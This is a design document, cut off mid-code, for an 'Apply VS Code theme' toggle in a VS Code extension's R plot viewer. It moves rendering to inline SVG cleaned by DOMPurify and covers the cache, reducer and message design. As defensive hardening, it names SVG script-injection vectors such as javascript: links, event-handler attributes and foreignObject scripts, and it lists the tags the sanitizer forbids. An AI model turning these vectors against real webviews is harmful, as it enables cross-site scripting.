# Plot Viewer: "Apply VS Code Theme" Toggle — Design

**Status**: Design (post-research, post-adversarial-review, pre-implementation).
**Author**: jbearak.
**Extends**: [`2026-05-06-vscode-plot-viewer-design.md`](./2026-05-06-vscode-plot-viewer-design.md) — original plot-viewer architecture remains authoritative; this design adds a theme toggle and changes the SVG rendering substrate from `<img>` to inline SVG.
**Review history**:
- **v1** had a fatal flaw — CSS overlay against `<img>`-loaded SVG cannot cascade.
- **v2** fixed that by switching to inline SVG.
- **v3** (first adversarial review) caught three issues: `:global()` in non-Svelte CSS file, missing `cachedSvg` writes, undefined `bg=null` semantics.
- **v4** (second adversarial review) addressed 15 additional findings: Svelte 5 `Map` reactivity (switch to `SvelteMap`), CSS placement (move into App.svelte `<style>` block with proper `:global()`), broadcast feedback-loop invariant, Phase 1 user-visible changes (LRU cap, bg shift) now explicit, DOMPurify forbid-list, `bg_for_fetch` helper, fixture-based regression test, `read_theme_bg` deletion, `evict_oldest` while-loop, `delete`-before-`set` comment, reducer no-op short-circuit, initial-render seeding mechanism.
- **v5** (third adversarial review) addressed: spec self-contradiction on `theme-changed` host-listener retention (line 497 said "deleted entirely", line 541 said "stays — becomes no-op"; resolved: deleted entirely); `pick_current_svg` post-quit branch was unreachable because `SET_ACTIVE_SESSION { sessionEnded: true }` preserves `activeSession` (fix: gate on `state.sessionEnded`, not `state.activeSession`); the webview's `state-update` handler must dispatch `SET_THEME_APPLIED` (was implied by "no-echo invariant" prose but not shown); DOMPurify config tightened (`FORBID_ATTR: ['style']` — defense in depth against CSS-exfil via inline `style=`); `draggable="false"` on plot-host to lock down the drag surface; cache key extended to `${sessionId}:${plotId}` to prevent cross-session cache collisions; cache semantics renamed FIFO (not LRU — touch happens only on insert; cache hits don't promote, by design); fetch closure captures `upid` so a late dispatch under a stale upid is dropped; Phase 4 task list aligned with §CSS overlay (rules live in App.svelte's `<style>`, not styles.css); CLAUDE.md invariant: webview message listener MUST install before `webview-ready` post; SvelteMap reactivity test moved from bun-only to a Svelte 5 mount test; layout-misalignment risk of `font-family` override documented prominently.
- **v6** (fourth adversarial review) addressed: closure race during session swap (fetch `.then` now also bails on `state.sessionEnded`); `state.activeSession!.upid` non-null assertion in `pick_current_svg` softened to optional chaining; FIFO reducer no-op short-circuits when the incoming entry equals the existing one byte-for-byte; DOMPurify `ADD_ATTR` claim corrected (SVG profile already permits `class`/`xmlns`/`viewBox`); `<style>` and `<foreignObject>` added to FORBID_TAGS; `ondragstart` handler dropped; explicit deletion checklist for `theme_sub`; httpgd fixture test uses `classList.contains('httpgd')`; cross-panel Memento broadcast race documented; CLAUDE.md invariant forbids host posting `state-update` from `create_panel`.
- **v7** (fifth adversarial review) addressed: cache key extended to `${sessionId}:${plotId}:${width}:${height}` (so resize refetches); stale "settled in v3" entry corrected (`themeApplied` IS a fetch dep); CLAUDE.md ADD_ATTR reference removed; `initial_state()` no longer reads `window` (bun tests have no DOM); freshness re-check uses `>=`; explicit `SET_THEME_APPLIED` reducer block; `await context.globalState.update(...)` made explicit in §Host changes; no-echo regression test scope clarified; `evict_oldest` iterator-recreation comment; `data:` audit Phase 1 task.
- **v8** (this revision, sixth adversarial review — final round, cap reached) addressed: (a) **pre-paint body class doesn't match `.plot-host.apply-vscode-theme`** — v7's "bake class on body so first paint is right" advice was wrong because the overlay selector requires the `.plot-host` element to exist, which only happens after Svelte mounts; fix: drop the body-class baking, rely on `onMount`'s synchronous `SET_THEME_APPLIED` dispatch which runs before the first commit-paint; the in-DOM `<svg>` doesn't exist either until fetch completes, so there's nothing for an early class to scope against. (b) **Post-quit fallback returned the OLDEST cached size, not the most recent** — `for (const [key, entry] of state.svgCache)` walks insertion order from oldest, so the first match is the oldest size; fix: iterate in reverse (most-recent-insertion-first). (c) **Resize gesture (60fps) can evict all history during a drag** — without dimension debounce, a 1-second drag at 60fps produces ~60 distinct (width, height) cache keys, blowing the 50-entry cap and evicting every other plot's history (regressing smoke test #10); fix: debounce `dimensions` updates in `on_resize` (100ms trailing) AND add an eviction tweak that keeps at most one entry per `(sessionId, plotId)` regardless of dimension. (d) **`<feImage>` in svgFilters profile** can reference external resources — added to FORBID_TAGS. (e) `SET_ACTIVE_SESSION` reducer no-op short-circuit added so a redundant `state-update` doesn't trigger a Svelte cascade. (f) `evict_oldest` "UB" wording corrected (Map delete during iteration IS defined behavior — entries are skipped if not yet visited; the rationale for re-creating the iterator is clarity, not safety). (g) `dimensions` regression test added to test plan. (h) `>=` freshness re-check rationale documented (same-upid bytes-diff is a transient httpgd error case where first-writer-wins is correct — same-bytes is short-circuited by the reducer; pathological diff-bytes-same-upid is treated as "trust the earlier completion"). (i) `__ravenInitialPlotState` cleared after first read so a panel restore doesn't re-apply a stale seed over a live state-update.

## Summary

Add a single binary toggle to Raven's plot viewer webview — "Apply VS Code theme" — that recolors the live preview to match the active editor theme. When on, the plot's canvas rectangle is hidden and SVG text/strokes are recolored via a CSS overlay; the webview's `--vscode-editor-background` shows through. When off, plots render with httpgd's defaults (white background, R-supplied colors), which is what the user sees today.

This is parity with REditorSupport.R's `r.plot.toggleStyle` / `r.plot.defaults.colorTheme: "vscode"`. Persistence is global via VS Code's `Memento` (mirroring Raven's existing knit-preview `THEME_PREFERENCE_KEY` pattern). Default is OFF.

**Substrate change**: Today Raven uses `<img src=httpgd-url>` to render plots. CSS in the parent webview does not cascade into image-loaded SVG, so a CSS overlay cannot reach the SVG's elements. To make the toggle work, the plot must be inlined into the DOM (matching vscode-R, which inserts `plt.svg` text via `innerHTML`). This design rewrites the webview's rendering layer to fetch SVG text and inline it under a sanitization step.

## Motivation

REditorSupport.R has shipped this toggle for years and users expect it. Raven's plot viewer currently has dead code that *tries* to follow the editor background — `App.svelte:read_theme_bg()` reads `--vscode-editor-background` and forwards it as httpgd's `bg=` query parameter — but the effect is invisible because R's drawing engines paint their own canvas rectangle on top:

- Base graphics: `par("bg") = "white"` by default.
- ggplot2: `theme_grey()`'s `plot.background = element_rect(fill = "white")` covers the full canvas.

So even though httpgd's SVG document background is set to (say) `#1e1e1e`, R immediately fills a `<rect width="100%" height="100%" fill="white"/>` over it. The user-visible result is the white plot we have today. vscode-R works around this by making R's canvas rect transparent with a CSS overlay (`.httpgd rect { fill: none !important; }`), so the webview body's background shows through.

## Non-goals

- **Per-panel toggle state.** Knit preview persists globally; the plot viewer should too. Toggling in one open panel updates all open panels.
- **VS Code settings key.** vscode-R's `r.plot.defaults.colorTheme` requires JSON editing; we use the toolbar button + Memento alone, matching knit preview.
- **Smart light-theme behavior.** On a light theme, `--vscode-editor-foreground` is dark and `--vscode-editor-background` is light — visually close to httpgd's defaults. The toggle still applies the editor's exact shades, but the contrast change is subtle. Documented rather than special-cased.
- **Preserving user-supplied colors** (`aes(color = species)`, `plot(..., col = "red")`). vscode-R uses `stroke: var(--vscode-editor-foreground) !important` on every stroked element, clobbering R-supplied colors. We match that behavior. Users who want their plot palette preserved turn the toggle off. Documented as a known limitation.
- **Toggle affecting Copy / Save / Open externally.** Exported plots must remain portable to recipients with different themes; today copy/save deliberately pass `bg=null` and we preserve that. The CSS overlay is webview-only and cannot affect httpgd render bytes anyway.
- **`r.plot.customStyleOverwrites` parity.** vscode-R lets users supply a custom CSS file via an absolute path. Raven's first iteration ships only the built-in overlay; a custom CSS path is a follow-up if requested.
- **R-side `par(bg=, fg=)` injection or ggplot2 theme overlay.** Neither vscode-R nor this design takes this route. CSS overlay is simpler, instant, and zero R round-trip.
- **PNG-export retinting.** A toggled-on theme cannot influence exported PNG bytes (no CSS overlay applies). Documented.

## Confirmed assumptions (from research)

- **vscode-R inlines SVG via `innerHTML`**, not via `<img src>`. Confirmed by reading [`vscode-R/src/plotViewer/webview/index.ts`](https://github.com/REditorSupport/vscode-R/blob/master/src/plotViewer/webview/index.ts) (`wrapper.innerHTML = html;`, `smallPlots[ind].innerHTML = plt.svg;`). This is structural: their CSS overlay only works because the SVG is in document context. **A CSS overlay against Raven's current `<img>`-loaded SVG would do nothing** — image-loaded SVG is rendered in a sub-document where parent CSS variables and rules do not cascade. This is the most important finding and shapes the design.
- **vscode-R's overlay is three CSS rules**: hide the first `.httpgd rect`, set `svg text { fill: var(--vscode-foreground); }`, set every stroked element's `stroke: var(--vscode-foreground)`. CSS variables auto-update on theme switch; no host-side palette resolution needed.
- **httpgd's SVG output has a root `<svg class="httpgd">`** and a leading `<rect>` for the canvas. Same assumption vscode-R relies on; confirmed against httpgd ≥ 2.0 (Raven's stated prerequisite).
- **Raven already wires `onDidChangeActiveColorTheme`** in `plot-viewer-panel.ts` and posts `{ type: 'theme-changed' }`. With inline SVG, CSS variables auto-update — no fetch is required on theme change.
- **Raven already has the trust-boundary pattern** in `plot/messages.ts` (`isExtensionToWebviewMessage`, `isWebviewToExtensionMessage`). New message types must be added to the union, the `Set<>` allowlist, AND the guard's switch — all in the same commit, validated by `tests/bun/plot-messages.test.ts`.
- **Raven already has Memento persistence for the knit-preview toggle** at `THEME_PREFERENCE_KEY = 'raven.knit.applyVSCodeTheme'`. We adopt the same shape with a new key `'raven.plot.applyVSCodeTheme'`.
- **httpgd's SVG output does not embed `<script>` or external references** in normal R/ggplot output, but R is user-controlled. Inlining SVG into the webview DOM exposes the webview to SVG-borne XSS if a user's plot somehow emits `<script>` or event handlers. The webview is sandboxed (CSP forbids `script-src` outside the nonce-protected bundle), but defense-in-depth says: sanitize via [`DOMPurify`](https://github.com/cure53/DOMPurify) in SVG mode before insertion. DOMPurify is already in widespread VS Code use; trade-off is one new dependency (~22 KB minified) in the webview bundle. Alternatives considered: (a) sanitizer.js — abandoned; (b) hand-rolled sanitization — risky; (c) trust httpgd unconditionally — fragile to upstream changes. DOMPurify wins.

## User-facing surface

### Webview toolbar

The toolbar gains a single toggle button at the right end, after Open Externally. Visual treatment matches knit preview's "Apply VS Code theme" button (`aria-pressed` true|false, accent border when on, checkmark `::before` pre-allocated width to prevent reflow).

```text
[‹] [›] 1/3 [✕]                [Copy] [PNG] [SVG] [PDF] [↗] [Apply VS Code theme]
```

- **Label**: "Apply VS Code theme" (constant; state via `aria-pressed`).
- **Default**: off.
- **Layout pressure**: at the existing button count + this one, narrow panels may wrap. Resolution: keep text label (consistent with knit preview); rely on the existing toolbar `flex-wrap` behavior; if real users report wrapping, follow up with an icon-only variant.

### Settings

**None.** Persistence is Memento-only, matching knit preview. The `raven.plot.viewerColumn` setting is unchanged.

### Commands

**None.** No command-palette entry, no keybinding. Toolbar-only, matching knit preview.

### Doc updates

- `docs/plot-viewer.md`: new "Color theme" section documenting the toggle, its default, the global persistence, the three known limitations (user-color clobber, no export retinting, subtle on light themes), and the underlying rendering-substrate change (inline SVG vs `<img>`).
- `docs/coexistence.md`: brief sentence noting parity with REditorSupport.R's `r.plot.toggleStyle`.

## Architecture

### Rendering substrate change (the core of the design)

**Today**: Raven's webview renders a plot as `<img class="plot" src={current_url}>`. The browser fetches the SVG from httpgd directly; rendering happens in image-document context. Parent CSS does not reach into the SVG.

**After**: Raven's webview renders a plot as `<div class="plot-host">` whose `innerHTML` is the (sanitized) SVG text fetched from httpgd. The SVG nodes live in the webview's document; parent CSS rules and CSS variables cascade in.

#### Why inline SVG and not `<object>` or `<iframe>`

- `<object type="image/svg+xml">`: loads SVG in a *separate document* whose CSS is isolated unless you reach in via `contentDocument` — possible but brittle, especially around CSP and timing.
- `<iframe>`: same isolation problem, plus extra panel layout overhead.
- Inline SVG: simplest, matches vscode-R, single CSS context, single sanitization boundary.

#### Fetch coordination

The webview's `httpgd-client` already opens a WebSocket to httpgd. On every `'message'` event (and on `'open'`), the client invokes `onChange()` which calls `client.fetchPlotIds()`. Today, that's all we need — the `<img src>` URL is then recomputed reactively and the browser fetches the bytes.

After this change, fetching the plot text becomes an explicit step in the webview:

```text
WebSocket onChange
        │
        ▼
fetchPlotIds() → [p1, p2, p3]
        │
        ▼
dispatch SET_PLOT_IDS — currentIndex moves to last
        │
        ▼
$effect on (plotId, upid, dimensions, themeApplied) fires
        │
        ▼
cache hit? (state.svgCache.get(plotId).upid === upid) — if so, return; else continue
        │
        ▼
abort any in-flight fetch
fetch(plot_url(..., bg=bg_for_fetch(themeApplied))) — see "Background parameter"
        │
        ▼
text = await response.text()
sanitized = sanitize_svg(text)
        │
        ▼
dispatch SET_SVG_CACHE_ENTRY with { plotId, entry: { svgText: sanitized, upid } }
        │
        ▼
{@html pick_current_svg(state).svgText} renders the SVG into the .plot-host div
```

Properties of this fetch loop:

1. **Abort on supersede.** Each fire of the effect aborts the previous in-flight fetch (mirrors today's `last_plot_blob_fetcher` discipline). Out-of-order responses cannot mislabel the displayed plot.
2. **Theme switch does not refetch.** The effect doesn't read `--vscode-editor-background` (CSS variables update inline SVG for free). No `theme-changed` round-trip is needed.
3. **Toggle flip causes one spurious effect run, no fetch.** Because `bg_for_fetch` returns the same value (`'#ffffff'`) in both branches today, the cache hit on `(plotId, upid)` short-circuits before fetching. The `themeApplied` dependency exists so a future divergence in `bg_for_fetch` Just Works.
4. **History navigation reads from cache.** Pressing `‹` to a previously-fetched plot is instant (cache hit). Navigating to a not-yet-fetched plot triggers a fetch.

#### Post-quit fallback and history navigation cache

Today's `<img>` design accidentally provides history-navigation caching: the browser's image cache holds every plot that has ever been displayed, so after R quits the user can still press `‹/›` to walk the history. The inline-SVG design loses this property unless we re-create the caching explicitly.

The webview holds a **FIFO SVG cache** keyed by `${sessionId}:${plotId}`:

```typescript
// In ViewerState:
type SvgEntry = {
    svgText: string;
    upid: number;        // distinguishes in-place updates of the same plotId
};
// SvelteMap<`${sessionId}:${plotId}`, SvgEntry>, capped at 50 entries
// (oldest INSERTED evicted on overflow — FIFO, not true LRU; see "Cache
// semantics" below). 50 × ~100 KB ≈ 5 MB worst case — fine for a long
// R session.
svgCache: SvelteMap<string, SvgEntry>;
```

**Why `SvelteMap` (from `svelte/reactivity`) and not a plain `Map`?** Svelte 5's `$state` proxy provides deep reactivity for objects, arrays, and primitives — but plain `Map` and `Set` are tracked only by identity. A `pick_current_svg($state.svgCache.get(id))` read inside a `$derived` would NOT re-fire on a `Map.set` that produced a new Map identity unless the derived re-read the cache reference itself. The standard Svelte 5 idiom for collection reactivity is the `svelte/reactivity` package's `SvelteMap` (and `SvelteSet`) — drop-in replacements that track per-entry reactivity correctly.

Alternative considered: `Record<string, SvgEntry>` (plain object) — also reactive under `$state`'s proxy. Rejected because (a) keys are arbitrary strings (UUID-style plotIds), and `Record` semantics around `delete` and ordered iteration are murkier than `Map`'s explicit insertion-order contract; (b) `SvelteMap` is the Svelte-idiomatic answer.

Every successful fetch dispatches `SET_SVG_CACHE_ENTRY { plotId, entry }` which the reducer applies via Map insertion + LRU eviction (the cap and policy live in the reducer, not in the effect, so it stays a pure function).

`pick_current_svg(state)` resolves the rendered SVG by reading the cache, not a separate `currentSvg` field:

```typescript
export function svg_cache_key(
    sessionId: string,
    plotId: string,
    width: number,
    height: number,
): string {
    return `${sessionId}:${plotId}:${width}:${height}`;
}

function pick_current_svg(
    state: ViewerState,
    dimensions: { width: number; height: number },
): SvgEntry | null {
    if (state.plotIds.length === 0) return null;
    const id = state.plotIds[state.currentIndex];
    const sessionId = state.activeSession?.sessionId;
    if (!sessionId) {
        // No activeSession at all (initial loading, panel restore before
        // host pushes session info): nothing to look up.
        return null;
    }
    const cacheKey = svg_cache_key(sessionId, id, dimensions.width, dimensions.height);
    // Post-quit branch — gate on sessionEnded explicitly, NOT on
    // activeSession being null. `SET_ACTIVE_SESSION { sessionEnded: true }`
    // PRESERVES `activeSession` (see reducer) so the live branch would
    // otherwise still run, demand a fresh `upid`, and reject every cached
    // entry the moment a points() call bumped upid just before R died.
    if (state.sessionEnded) {
        // Tolerate upid mismatch — httpgd is dead and the cached bytes
        // are the best we have. Post-quit dimension changes can't refetch,
        // so if the user resizes the panel after R quits, we either
        // (a) show the cached entry for the most-recently-fetched
        // dimensions of this plotId (slight scale mismatch — acceptable,
        // the user already saw "R session ended"), or (b) show nothing.
        // Pick (a): try the live-dimension cache key first; on miss,
        // walk the cache in REVERSE insertion order so the most recent
        // entry wins (a forward walk would return the oldest cached size,
        // which is worse for the user — typically smaller than their
        // current viewport).
        const live = state.svgCache.get(cacheKey);
        if (live) return live;
        const prefix = `${sessionId}:${id}:`;
        const entries = Array.from(state.svgCache.entries());
        for (let i = entries.length - 1; i >= 0; i--) {
            const [key, entry] = entries[i];
            if (key.startsWith(prefix)) return entry;
        }
        return null;
    }
    const entry = state.svgCache.get(cacheKey);
    if (!entry) return null;        // waiting for fetch
    // Optional chaining instead of `state.activeSession!.upid`: a future
    // reducer change that sets `activeSession = null` without flipping
    // `sessionEnded = true` would otherwise crash here. With `?.`, the
    // resulting `undefined !== entry.upid` short-circuits to `null`.
    if (entry.upid !== state.activeSession?.upid) return null;  // stale
    return entry;
}
```

The `svg_cache_key` helper is also called from the fetch effect's cache lookup and from the dispatch payload, so the key shape lives in one place.

This collapses spec v2's separate `currentSvg` + `cachedSvg` fields into a single store. Phase 1 implementation work shrinks: one Map, one reducer action, one selector.

**Cache key shape**: `${sessionId}:${plotId}:${width}:${height}` — sessionId-scoped so two R sessions sharing accidentally-colliding plotIds never serve each other's bytes, and dimension-keyed so resize triggers a refetch (httpgd bakes `width`/`height` attributes into the SVG at render time, so the same plotId at a different size IS a different image; without dimensions in the key the resize would hit the cache and the SVG would stay at the prior size). Width/height are rounded to integer pixels (already the case in `dimensions`).

**Resize debounce**: a naive resize gesture (60fps × 1s = 60 distinct `(width, height)` pairs) would flood the 50-entry cache and evict every other plot's history during the drag, regressing the post-quit history-navigation smoke test (#10). To prevent this, `on_resize` in `App.svelte` is debounced with a 100ms trailing edge (use the existing pattern from the data-viewer panel — `setTimeout` cancel-and-restart on each event). The fetch effect only fires after the gesture settles; intermediate sizes are not fetched.

**Per-plot eviction discipline**: the FIFO `evict_oldest` is augmented to enforce "at most one entry per `(sessionId, plotId)` prefix in the cache". When a new `SET_SVG_CACHE_ENTRY` lands, the reducer drops any prior entries sharing the same `(sessionId, plotId)` prefix (older sizes for the same plot — they're stale by definition once a new size is in). This bounds the cache at ≤ 50 plots, not ≤ 50 (plot, size) pairs, so a resize that does slip through the debounce can't evict navigation history. Pseudocode:

```typescript
function purge_other_sizes(cache: SvelteMap<string, SvgEntry>, newCacheKey: string): void {
    // cacheKey shape: "sessionId:plotId:w:h" — prefix to match is everything
    // up to the last two ":w:h" segments.
    const lastSep = newCacheKey.lastIndexOf(':');
    if (lastSep < 0) return;
    const secondLastSep = newCacheKey.lastIndexOf(':', lastSep - 1);
    if (secondLastSep < 0) return;
    const prefix = newCacheKey.slice(0, secondLastSep + 1); // "sessionId:plotId:"
    for (const key of Array.from(cache.keys())) {
        if (key !== newCacheKey && key.startsWith(prefix)) cache.delete(key);
    }
}
```

Called from the `SET_SVG_CACHE_ENTRY` reducer case AFTER the `next.delete(action.cacheKey); next.set(action.cacheKey, action.entry)` pair, BEFORE `evict_oldest`.

**Live session**: the `$effect` fetches the current plot's SVG, dispatches `SET_SVG_CACHE_ENTRY`. Backward navigation (`‹`) reads from the cache instantly if the entry is fresh; otherwise the effect refetches. Forward navigation (`›`) the same.

**Post-quit**: `pick_current_svg` returns whatever is in the cache for that plotId. Pressing `‹/›` walks any plots the user already viewed before R quit. Plots not yet rendered (skipped via R producing 5 plots in a row before the user looked) are NOT cached and show the placeholder.

**Edge cases**:
- Cache eviction during navigation: pressing `‹` to a plot that has been evicted triggers an effect-driven refetch (live session) or returns null (post-quit). Acceptable.
- `upid` bump during navigation: when `points()` updates an existing plotId, the WebSocket fires, fetchPlotIds returns the same list with a new `activeSession.upid`. The cache entry's `upid` no longer matches, the selector returns null, the effect fires, the new SVG replaces the cache entry. Correct behavior.
- Map identity for Svelte reactivity: `SET_SVG_CACHE_ENTRY` must return a NEW Map (`new Map(state.svgCache).set(id, entry)`) — mutating the existing Map won't trigger Svelte's `$state` reactivity. Reducer tested for this.

#### CSP

The webview already declares `connect-src` allowing loopback HTTP and the tunnel HTTP equivalent (so `fetch(plot_url)` is permitted). No CSP `connect-src` change required.

**`img-src` cleanup**: today's CSP allows `img-src` to include `blob:` and `data:` (used by the blob-URL fallback that captures plots post-quit). After this design, the `<img>` element is gone and we no longer create blob URLs. The CSP `img-src` directive can drop both `blob:` and `data:` from its source list — narrower CSP, smaller attack surface. Implementer should remove them in lockstep with the substrate switch (Phase 1).

The webview's `script-src` keeps its nonce restriction. `{@html ...}` does NOT execute `<script>` tags inserted via `innerHTML` per the HTML5 parsing spec (this is independent of CSP). SVG-specific vectors (`<foreignObject><script>`, `xlink:href="javascript:..."`, `onclick=` attributes) are stripped by DOMPurify's SVG profile. The CSP nonce restriction on `script-src` is the third line of defense behind the parser and the sanitizer.

### Message protocol changes

`editors/vscode/src/plot/messages.ts` gains:

```typescript
// StateUpdatePayload — extended
export type StateUpdatePayload = {
    activeSession: ActiveSessionInfo | null;
    sessionEnded: boolean;
    themeApplied: boolean;  // NEW
};

// WebviewToExtensionMessage — extended
| { type: 'set-theme-applied'; payload: { applied: boolean } };
```

- `WEBVIEW_TO_EXTENSION_TYPES` adds `'set-theme-applied'`.
- `isWebviewToExtensionMessage`'s switch adds a case validating `payload.applied` is a boolean. Matches the existing plot trust-boundary style: positive shape assertions, no extra-key rejection. (Knit preview's `MESSAGE_SCHEMAS` does exact-key matching; plot's `messages.ts` historically does not. Tightening the whole plot guard surface is out of scope for this design — track as a separate cleanup if desired.)
- `isExtensionToWebviewMessage`'s `state-update` case extends to require `payload.themeApplied` is a boolean.
- Regression tests in `tests/bun/plot-messages.test.ts` cover the new shapes.

### Webview state changes

`editors/vscode/src/plot/webview/state.ts`:

```typescript
export type ViewerState = {
    phase: Phase;
    activeSession: ActiveSessionInfo | null;
    plotIds: string[];
    currentIndex: number;
    sessionEnded: boolean;
    themeApplied: boolean;                  // NEW: mirrors host globalState
    svgCache: SvelteMap<string, SvgEntry>;  // NEW: LRU cache (cap 50), plotId → svg
};

type SvgEntry = {
    svgText: string;
    upid: number;
};

export type ViewerAction =
    // existing actions kept; SET_THEME_BG removed (no longer used)
    | { type: 'SET_THEME_APPLIED'; themeApplied: boolean }
    | { type: 'SET_SVG_CACHE_ENTRY'; cacheKey: string; entry: SvgEntry }
    | { type: 'SESSION_ENDED' };
```

**Removed**: `SET_THEME_BG` action and `themeBg` field. The current `bg=` parameter wiring is dead in the new design (CSS overlay handles theme); we delete it.

**`pick_image_src` is replaced** by `pick_current_svg(state, dimensions)` — see "Post-quit fallback and history navigation cache" above for the implementation. Returns the cache entry for the current `(sessionId, plotId, width, height, upid)` or null. The second parameter (dimensions) is required because the cache key includes width/height; post-quit, the selector tolerates dimension drift by scanning for any entry with the same `(sessionId, plotId)` prefix.

**`compute_snapshot_key`**: removed. The new effect's dependencies are explicit (`plotIds`, `currentIndex`, `activeSession.upid`, `dimensions.width`, `dimensions.height`, `themeApplied`). No separate identity function needed.

**Cache semantics — FIFO, not LRU**. The reducer touches insertion order on every WRITE (cache miss + dispatch). It does NOT touch on cache hits (history navigation, repeat views). So an entry's "age" is the time since its last fetch, not the time since its last view. The 50-entry cap means: if a long R session has produced >50 distinct plots, the oldest fetched fall out as new ones come in — even if the user navigates back to plot #1 repeatedly. Why FIFO is acceptable: (a) typical sessions are well under 50; (b) the eviction surface is post-quit history walking, where users tend to scrub recent plots, not visit-then-revisit-50-plots-later; (c) a true-LRU would require a `TOUCH_SVG_CACHE_ENTRY` action dispatched from the cache-hit short-circuit, adding complexity and a noisy reducer-action stream for no measurable user benefit at the chosen cap. If real usage reveals a pattern that needs LRU, that's a follow-up: add `TOUCH_SVG_CACHE_ENTRY` and dispatch from the effect's hit branch.

**FIFO eviction in the reducer**:

```typescript
const SVG_CACHE_CAP = 50;

function evict_oldest(cache: SvelteMap<string, SvgEntry>): SvelteMap<string, SvgEntry> {
    // While-loop (not single `if`): if a future feature ever batches multiple
    // SET_SVG_CACHE_ENTRY inserts into one reducer call, we still maintain the
    // cap. Trivial overhead today (size <= cap + 1), defensive for tomorrow.
    //
    // We re-create the iterator each pass (`cache.keys().next()`) rather
    // than hoisting one outside the loop. Map iteration with concurrent
    // `delete` IS defined behavior — deleted entries are skipped on the
    // next `next()` — but the per-pass form is clearer about intent and
    // doesn't rely on subtle iterator behavior. Leave as-is.
    while (cache.size > SVG_CACHE_CAP) {
        // SvelteMap iteration is insertion order (Map contract); first key is oldest.
        const oldest = cache.keys().next().value;
        if (oldest === undefined) break;
        cache.delete(oldest);
    }
    return cache;
}

// SET_THEME_APPLIED case (shown explicitly so implementers don't miss the
// no-op short-circuit's reference-identity guarantee):
case 'SET_THEME_APPLIED': {
    // No-op short-circuit: return the SAME state reference (not a fresh
    // {...state}) so a downstream `Object.is(prev, next)` check passes
    // and Svelte's `$state` proxy doesn't trigger a cascade. This matters
    // for the broadcast case where panel A's own broadcast echoes back
    // to itself — without the short-circuit, every broadcast triggers a
    // full reactive pass for every open panel, including the originator.
    if (state.themeApplied === action.themeApplied) return state;
    return { ...state, themeApplied: action.themeApplied };
}

// In reduce(), SET_SVG_CACHE_ENTRY case:
case 'SET_SVG_CACHE_ENTRY': {
    // No-op short-circuit: if the existing entry equals the incoming one
    // byte-for-byte AND upid matches, return state unchanged (preserve
    // reference identity so Svelte's $state skips the cascade and the
    // FIFO insertion order is not perturbed by a churn-promotion). The
    // fetch effect's cache-hit short-circuit already prevents the bytes-
    // identical case, so this branch is defensive — it matters only if
    // a future bg_for_fetch divergence makes the effect dispatch under
    // an identical-byte cache hit.
    const existing = state.svgCache.get(action.cacheKey);
    if (existing && existing.upid === action.entry.upid && existing.svgText === action.entry.svgText) {
        return state;
    }
    const next = new SvelteMap(state.svgCache);
    // delete-before-set is load-bearing: Map.set on an existing key updates
    // the value but DOES NOT change insertion order. To refresh the entry's
    // FIFO position (so an in-place upid bump moves it back to most-recent),
    // we must delete and re-insert.
    next.delete(action.cacheKey);
    next.set(action.cacheKey, action.entry);
    return { ...state, svgCache: evict_oldest(next) };
}
```

A new `SvelteMap` is constructed per dispatch so `$state` registers the identity change. `SvelteMap` also propagates per-entry reactivity, which matters for `pick_current_svg` reads via `state.svgCache.get(cacheKey)`.

### Webview rendering changes (App.svelte)

The single biggest code change:

```svelte
<!-- Before -->
<img class="plot" src={current_url} alt=... oncontextmenu={...} />

<!-- After -->
<div class="plot-host"
     class:apply-vscode-theme={state.themeApplied}
     bind:this={plotHostEl}
     draggable="false"
     oncontextmenu={on_plot_context_menu}>
    {#if currentSvg}
        {@html currentSvg.svgText}
    {/if}
</div>
```

where `currentSvg` is a `$derived(pick_current_svg(state))`.

Where `apply-vscode-theme` is the class the CSS overlay scopes against. The class lives on the host div (not `<html>` as in spec v1) so the styles are tightly scoped and the rest of the toolbar/banner isn't affected.

Svelte 5's `{@html ...}` does not execute scripts on insertion in browsers (per the HTML5 spec), and DOMPurify strips them anyway.

**`draggable="false"`** locks the substrate's drag surface down. Today's `<img>` carries the browser's built-in "drag image to desktop" affordance; an inline `<svg>` inside a `<div>` doesn't by default, but webview hosts have been known to enable text-selection drag on SVG nodes. We don't want to leave drag-with-no-payload as a stub for an accidental touchpad gesture. The toolbar Copy / Save buttons remain the supported flows. We do NOT add an `ondragstart` preventDefault handler — `draggable="false"` already inhibits drag initiation on a non-draggable element, so the handler would be dead code (v5 included it; v6 removed it).

The live `$effect` (today: captures blob URLs) becomes:

```typescript
$effect(() => {
    // Explicit dependency reads (keep these even if unused in URL build,
    // so Svelte registers the dependencies for reactivity).
    const session = state.activeSession;
    const plotId = state.plotIds[state.currentIndex];
    const upid = session?.upid ?? 0;
    const w = dimensions.width;
    const h = dimensions.height;
    if (!session || !plotId) return;
    if (state.sessionEnded) return;  // post-quit: no fetch, draw from cache only

    // Cache hit short-circuit runs BEFORE the abort/assign block. Two
    // consequences worth pinning:
    //   1. A cache-hit run does NOT abort the prior in-flight fetcher
    //      (`last_fetcher`). That's deliberate: if fetch X is in flight
    //      and the user navigates away to cached Y then back to X, the
    //      X fetch should still complete and write its bytes into the
    //      cache — aborting it would waste the work.
    //   2. A cache-miss run aborts whatever the previous fetcher was
    //      pointing at, even if that previous fetcher's response would
    //      have populated the current plotId's entry. The new fetch is
    //      a fresh request (e.g. upid changed); the previous response
    //      would be stale anyway.
    const cacheKey = svg_cache_key(session.sessionId, plotId, w, h);
    const cached = state.svgCache.get(cacheKey);
    if (cached && cached.upid === upid) return;

    last_fetcher?.abort();
    const controller = new AbortController();
    last_fetcher = controller;

    // Capture the upid in the closure so a late dispatch under a stale
    // upid is dropped. Without this guard: fetch X starts at upid=5,
    // the user runs points() which bumps upid to 6, the cache-miss
    // effect for upid=6 aborts X and starts fetch Y. If X's response
    // arrived between the abort being scheduled and the controller's
    // signal being acted on, the .then would still run and dispatch
    // SET_SVG_CACHE_ENTRY with upid=5 — overwriting the (correct)
    // upid=6 entry that Y is about to write. The `capturedUpid !==
    // session.upid` guard at dispatch time prevents that.
    const capturedUpid = upid;
    const capturedSessionId = session.sessionId;

    const url = plot_url(session.httpgdBaseUrl, session.httpgdToken, plotId, {
        format: 'svg',
        width: w,
        height: h,
        bg: bg_for_fetch(state.themeApplied),  // see helper definition below
        upid,
    });

    void fetch(url, { signal: controller.signal })
        .then(r => r.ok ? r.text() : null)
        .then(text => {
            if (!text || controller.signal.aborted) return;
            // Bail if the session disconnected while in flight — a fetch that
            // resolves AFTER R quits would otherwise pollute the cache with
            // bytes from a dead session under the wrong sessionId prefix.
            if (state.sessionEnded) return;
            // Drop if the session swapped or upid moved while in flight.
            if (state.activeSession?.sessionId !== capturedSessionId) return;
            if (state.activeSession?.upid !== capturedUpid) return;
            // Freshness re-check: if another fetch already populated the
